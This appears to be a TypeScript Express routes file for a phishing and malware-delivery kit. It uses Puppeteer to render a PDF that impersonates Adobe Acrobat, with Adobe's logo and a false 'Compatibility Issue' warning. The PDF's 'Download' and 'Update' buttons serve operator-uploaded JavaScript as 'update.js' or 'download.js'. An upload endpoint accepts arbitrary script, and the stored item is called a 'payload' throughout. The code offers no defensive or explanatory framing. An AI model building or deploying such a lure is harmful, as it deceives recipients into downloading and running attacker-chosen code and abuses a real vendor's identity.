import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import puppeteer from "puppeteer";
import { readFileSync } from "fs";
import { resolve } from "path";

async function generatePDFMatchingHomepage(
  jsContent: string,
  filename: string
): Promise<string> {
  // Use absolute URL from environment if available, otherwise fallback to standard domain
  const domain = process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_SLUG + "." + process.env.REPLIT_OWNER + ".repl.co";
  const baseUrl = `https://${domain}`;

  // Read the Adobe logo and convert to base64
  let logoBase64 = "";
  try {
    const logoPath = resolve(process.cwd(), "attached_assets/adobe_reader_14145_1766295497679.png");
    const logoBuffer = readFileSync(logoPath);
    logoBase64 = `data:image/png;base64,${logoBuffer.toString("base64")}`;
  } catch (err) {
    console.error("Logo read error, using fallback:", err);
    // Fallback placeholder if logo is missing
    logoBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAABmJLR0QA/wD/AP+gvaeTAAAAy0lEQVQokWNkYGD4z8DAwMjAxMDAwPD//38GBkYGRkZGBkZGRgYGRgYGBiYGBkZGRkZGRgYGBgYGBiZGRgYGBkZGBkZGBgYGBgYGBiYmRkYGBkZGBkZGBgYGBgYGBiYmBkZGBgZGRgYGBgYGBgYmRkZGBkZGBgYGBgYGBgYGRkZGBgYGRkYGBgYGBgYGRgYGRkZGBkZGBgYGBkYGBgYGBgYGZkYGBkZGBgZGBgYGBgYGBkZGRgZGBkZGBgYGBgYGBgYGBkZGBkZGBgYGBgYGBgYGBkZGBkZGBkZGBkYGhv/8/wwMhPgDz4fST5+DT5gAAAAASUVORK5CYII=";
  }

  // HTML that matches the homepage design - with real anchor tags for PDF link support
  const htmlContent = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      -webkit-print-color-adjust: exact;
    }
    .card {
      width: 280px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.15);
      overflow: hidden;
      transform: scale(0.85);
      transform-origin: center center;
    }
    .header-strip {
      height: 3px;
      background-color: #e31c23;
    }
    .header {
      padding: 12px;
      border-bottom: 1px solid #e5e7eb;
      display: flex;
      gap: 8px;
    }
    .logo-box {
      width: 28px;
      height: 28px;
      background-color: #fce7e7;
      border: 0.5px solid #f3f3f3;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }
    .logo-box img {
      width: 20px;
      height: 20px;
      opacity: 0.8;
    }
    .header-text h2 {
      margin: 0;
      font-size: 12px;
      font-weight: 700;
      color: #111;
    }
    .header-text p {
      margin: 2px 0 0 0;
      font-size: 10px;
      font-weight: 600;
      color: #e31c23;
      display: flex;
      align-items: center;
      gap: 3px;
    }
    .content {
      padding: 10px 12px;
      font-size: 11px;
      line-height: 1.4;
      color: #666;
      border-bottom: 1px solid #e5e7eb;
    }
    .buttons {
      padding: 8px 12px;
      display: flex;
      gap: 6px;
      background-color: #fafafa;
    }
    .btn {
      flex: 1;
      text-decoration: none;
      padding: 6px 8px;
      border-radius: 4px;
      font-size: 10px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 4px;
      border: none;
    }
    .btn-download {
      background-color: white;
      border: 0.5px solid #d1d5db;
      color: #1f2937;
    }
    .btn-update {
      background-color: #e31c23;
      color: white;
    }
    .footer {
      padding: 6px 12px;
      background-color: #fafafa;
      border-top: 1px solid #e5e7eb;
      font-size: 9px;
      color: #9ca3af;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="header-strip"></div>
    <div class="header">
      <div class="logo-box">
        <img src="${logoBase64}" alt="Adobe">
      </div>
      <div class="header-text">
        <h2>Adobe Acrobat</h2>
        <p>Compatibility Issue</p>
      </div>
    </div>
    <div class="content">
      Your PDF reader may not fully support encrypted documents. Please update or download Adobe Reader.
    </div>
    <div class="buttons">
      <a href="${baseUrl}/api/download?type=download" class="btn btn-download">
        Download
      </a>
      <a href="${baseUrl}/api/download?type=update" class="btn btn-update">
        Update
      </a>
    </div>
    <div class="footer">
      Use latest Adobe Acrobat Reader for optimal compatibility.
    </div>
  </div>
</body>
</html>
  `;

  // Generate PDF using Puppeteer
  let browser: any;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-software-rasterizer',
        '--single-process',
        '--no-zygote'
      ],
      // Let's try to not force LD_LIBRARY_PATH if it's breaking things, 
      // but instead rely on the system packages being available.
    });
    
    const page = await browser.newPage();
    await page.setContent(htmlContent, { waitUntil: 'networkidle0' });
    
    const pdfBuffer = await page.pdf({
      format: 'Letter',
      margin: { top: 0, right: 0, bottom: 0, left: 0 },
      printBackground: true,
    });

    await browser.close();
    return Buffer.from(pdfBuffer).toString('base64');
  } catch (err) {
    if (browser) {
      await browser.close();
    }
    console.error("PDF generation error:", err);
    throw new Error("Failed to generate PDF");
  }
}

async function seedDefaultPayload() {
  const existing = await storage.getLatestPayload();
  if (!existing) {
    const defaultJS = `console.log("Adobe Acrobat - Security Update Available");`;
    const pdfBase64 = await generatePDFMatchingHomepage(defaultJS, "update.js");
    await storage.savePayload({
      filename: "update.js",
      jsContent: defaultJS,
      pdfData: pdfBase64,
    });
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  await seedDefaultPayload();

  app.post(api.payloads.upload.path, async (req, res) => {
    try {
      const input = api.payloads.upload.input.parse(req.body);
      const pdfBase64 = await generatePDFMatchingHomepage(input.jsContent, input.filename);

      const payload = await storage.savePayload({
        filename: input.filename,
        jsContent: input.jsContent,
        pdfData: pdfBase64,
      });

      res.status(201).json({ success: true, id: payload.id });
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      console.error("Upload error:", err);
      res.status(500).json({ message: "Failed to generate PDF" });
    }
  });

  app.get(api.payloads.getLatest.path, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).json({ message: "No payload found" });
    }
    res.json({ filename: payload.filename, jsContent: payload.jsContent });
  });

  app.get(api.payloads.download.path, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).send("No update available.");
    }

    const type = req.query.type as string || 'download';
    const filename = type === 'update' ? 'update.js' : 'download.js';

    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Content-Length', Buffer.byteLength(payload.jsContent));
    res.send(payload.jsContent);
  });

  app.get(api.payloads.downloadPdf.path, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).send("No payload found");
    }

    const pdfBuffer = Buffer.from(payload.pdfData, "base64");
    res.setHeader("Content-Type", "application/pdf");
    res.setHeader("Content-Disposition", `attachment; filename="adobe-acrobat-reader.pdf"`);
    res.send(pdfBuffer);
  });

  return httpServer;
}
